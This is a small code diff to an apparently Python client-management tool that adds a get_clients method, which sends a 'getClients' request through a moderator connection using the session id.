@@ -75,6 +75,9 @@ class Actions:
 
         self.ui.disable_administrator()
 
+    def get_clients(self):
+        self.moderat.moderator.send_msg(message='getClients', mode='getClients', session_id=self.moderat.session_id)
+
     @client_is_selected
     def set_alias(self):
         '''
